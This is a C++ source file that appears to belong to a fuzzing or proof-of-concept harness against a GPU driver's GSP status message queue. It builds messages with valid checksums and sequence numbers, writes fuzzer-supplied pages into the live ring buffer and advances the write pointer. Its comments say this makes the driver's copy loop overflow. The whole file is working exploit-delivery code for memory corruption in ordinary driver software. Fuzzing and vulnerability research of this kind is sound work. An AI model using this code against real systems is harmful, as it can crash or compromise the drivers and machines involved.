#include "message_queue.h"
#include "gpu_instrumentation.h"
#include "utilities.h"
#include <array>
#include <cerrno>
#include <cstdint>
#include <cstring>
#include <optional>
#include <stdexcept>
#include <vector>

//
// msgqTxHeader / rxHeader field offsets, relative to status_queue_iova.
// Mirrors the proven layout used by the standalone minimal.cu harness.
//
static constexpr std::uint64_t TXHDR_MSGCOUNT_OFF{12};
static constexpr std::uint64_t TXHDR_WRITEPTR_OFF{16};
static constexpr std::uint64_t TXHDR_ENTRYOFF_OFF{28};
static constexpr std::uint64_t RXHDR_READPTR_OFF{32};

struct POCConfig {
	std::uint32_t num_entries; // msgCount (63)
	std::uint32_t entry_size; // 4096

	POCConfig()
	    : num_entries{63}, entry_size{0x1000}
	{
	}
};

const POCConfig config{};

//
// Build a message of `msgLength` queue elements: element 0 is a well-formed
// header (elemCount = msgLength, valid checksum, expected seqNum), elements
// 1..N-1 are the fuzzer-supplied body pages. Header fields are harness-owned
// (delivery/validity invariants); the body is fuzzer-owned content.
//
static std::vector<std::uint8_t> makePayload(const std::uint32_t msgLength,
					     const std::uint32_t rxSeqNum,
					     const std::uint8_t* buffer_ptr,
					     const std::uint32_t buffer_size)
{
	std::vector<std::uint8_t> payload(static_cast<std::size_t>(msgLength) *
					  config.entry_size);

	StatusQueueEntry head{
	    .checkSum = 0,
	    .seqNum = rxSeqNum,
	    .elemCount = msgLength,
	    .rpc_version = 0x03000000,
	    .rpc_signature = 0x43505256,
	    .rpc_length = 0x20,
	    .rpc_function = 0x1001,
	};
	set_valid_checksum(head);

	if (payload.size() < sizeof(head)) {
		throw std::runtime_error(
		    "Payload is too small for StatusQueueEntry");
	}

	std::memcpy(payload.data(), &head, sizeof(head));
	std::memcpy(payload.data() + config.entry_size, buffer_ptr, buffer_size);

	return payload;
}

int insert_payload(std::uint8_t* buffer_ptr, const std::uint32_t buffer_size)
{
	const auto info{getGspMsgQueueInfo()};
	if (!info) {
		errno = ENODEV;
		return -1;
	}

	if (buffer_size == 0 || buffer_size % config.entry_size != 0 ||
	    buffer_size > info->status_queue_size - config.entry_size) {
		errno = EINVAL;
		return -1;
	}

	// One header element + one element per body page = elemCount.
	const std::uint32_t msgLength{(buffer_size / config.entry_size) + 1};

	//
	// Read the live ring header. The overflow needs >= elemCount elements to
	// be *available* (writePtr - readPtr), so we place the message starting
	// at the next-to-be-read slot and advance writePtr to advertise it.
	//
	const auto msgCountBuf{
	    dumpMemoryRegion(info->status_queue_iova, TXHDR_MSGCOUNT_OFF, 4)};
	const auto entryOffBuf{
	    dumpMemoryRegion(info->status_queue_iova, TXHDR_ENTRYOFF_OFF, 4)};
	const auto readPtrBuf{
	    dumpMemoryRegion(info->status_queue_iova, RXHDR_READPTR_OFF, 4)};
	if (!msgCountBuf || !entryOffBuf || !readPtrBuf) {
		return -1;
	}
	const std::uint32_t msgCount{bufToU32(msgCountBuf->data())};
	const std::uint32_t entryOff{bufToU32(entryOffBuf->data())};
	const std::uint32_t readPtr{bufToU32(readPtrBuf->data())};

	if (msgCount == 0 || msgLength > msgCount) {
		errno = EIO;
		return -1;
	}

	const auto payload{makePayload(msgLength, info->rxSeqNum, buffer_ptr,
				       buffer_size)};

	// Write each element into its (possibly wrapping) ring slot.
	for (std::uint32_t e{0}; e < msgLength; ++e) {
		const std::uint32_t slot{(readPtr + e) % msgCount};
		const std::uint64_t dstOff{
		    entryOff +
		    static_cast<std::uint64_t>(slot) * config.entry_size};
		const std::vector<std::uint8_t> element(
		    payload.begin() +
			static_cast<std::size_t>(e) * config.entry_size,
		    payload.begin() +
			static_cast<std::size_t>(e + 1) * config.entry_size);
		if (modifyMemoryRegion(info->status_queue_iova, dstOff,
				       element) == -1) {
			return -1;
		}
	}

	//
	// DELIVERY: advertise msgLength available elements. Without this the
	// driver never enters the copy loop far enough to overflow.
	//
	const std::uint32_t newWritePtr{(readPtr + msgLength) % msgCount};
	const std::array<std::uint8_t, 4> wpBuf{u32ToBuf(newWritePtr)};
	if (modifyMemoryRegion(
		info->status_queue_iova, TXHDR_WRITEPTR_OFF,
		std::vector<std::uint8_t>(wpBuf.begin(), wpBuf.end())) == -1) {
		return -1;
	}

	return 0;
}
